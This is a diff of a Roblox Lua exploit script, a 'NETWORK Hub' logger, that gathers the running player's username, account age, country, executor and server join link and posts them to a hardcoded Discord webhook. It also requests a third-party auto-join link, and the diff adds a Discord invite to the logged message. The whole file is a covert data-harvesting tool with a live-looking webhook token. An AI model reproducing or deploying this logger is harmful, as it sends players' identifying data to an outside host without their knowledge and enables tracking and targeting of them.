@@ -1,12 +1,14 @@
 -- Ultimate NETWORK HUB-style Logger (2025-2026 Edition) + Dynamic Joiner
 local Players = game:GetService("Players")
 local Http = game:GetService("HttpService")
-local Market = game:GetService("MarketplaceService")
 local LocalizationService = game:GetService("LocalizationService")
 
 local plr = Players.LocalPlayer
 
 local webhook = "https://webhook.lewisakura.moe/api/webhooks/1500270818708684900/rjjsg9lOzPOMbh0AMuKFxDa4nYA7wos1EKe6h728YvTSB0_xqusuK5fD_50-dR5pipYm"
+
+-- ←←← CHANGE THIS TO YOUR DISCORD INVITE ←←←
+local discordInvite = "https://discord.gg/GmT3uvzhVH"
 
 local executor = getexecutorname and getexecutorname() 
     or identifyexecutor and identifyexecutor()
@@ -14,51 +16,46 @@ local executor = getexecutorname and getexecutorname()
 
 -- Get Country
 local function getCountry()
-    local success, code = pcall(function()
-        return LocalizationService:GetCountryRegionForPlayerAsync(plr)
-    end)
-    return success and code or "Unknown"
+    local success, code = pcall(function()
+        return LocalizationService:GetCountryRegionForPlayerAsync(plr)
+    end)
+    return success and code or "Unknown"
 end
-
-local gameName = "Unknown Game"
-pcall(function()
-    gameName = Market:GetProductInfo(game.PlaceId).Name
-end)
 
 -- Dynamic Join Link
 local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
--- Logger Data
+-- Logger Data with Clickable Discord Link
 local data = {
-    content = "|| New Log claimed ||",
-    embeds = {{
-        title = "Info",
-        description = "",
-        color = 0x2F3136,
-        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
-        fields = {
-            {name = "Username",      value = plr.Name,                  inline = true},
-            {name = "Account Age",   value = plr.AccountAge .. " Days", inline = true},
-            {name = "Country",       value = getCountry(),              inline = true},
-            {name = "Executor",      value = executor,                  inline = true},
-            {name = "Join Link",     value = joinLink,                  inline = true},
-        },
-        footer = {text = "NETWORK Hub • "..os.date("%Y-%m-%d %X")},
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }}
+    content = "|| New Log claimed ||",
+    embeds = {{
+        title = "Info",
+        description = "**[🔗 Join Discord Server](" .. discordInvite .. ")**",
+        color = 0x2F3136,
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
+        fields = {
+            {name = "Username",      value = plr.Name,                 inline = true},
+            {name = "Account Age",   value = plr.AccountAge .. " Days", inline = true},
+            {name = "Country",       value = getCountry(),              inline = true},
+            {name = "Executor",      value = executor,                 inline = true},
+            {name = "Join Link",     value = joinLink,                 inline = true},
+        },
+        footer = {text = "NETWORK Hub • "..os.date("%Y-%m-%d %X")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
 }
 
 -- Send Log
 local req = syn and syn.request or http_request or request or Http.request or HttpPost
 if req then
-    pcall(function()
-        req({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = Http:JSONEncode(data)
-        })
-    end)
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = Http:JSONEncode(data)
+        })
+    end)
 end
 
 -- Auto Join via Fern.wtf
@@ -66,12 +63,12 @@ print("🌐 Attempting to join current server via Fern.wtf...")
 print("Join Link: " .. joinLink)
 
 pcall(function()
-    if request then
-        request({
-            Url = joinLink,
-            Method = "GET"
-        })
-    end
+    if request then
+        request({
+            Url = joinLink,
+            Method = "GET"
+        })
+    end
 end)
 
 print("✅ Network Hub + Joiner executed successfully.")
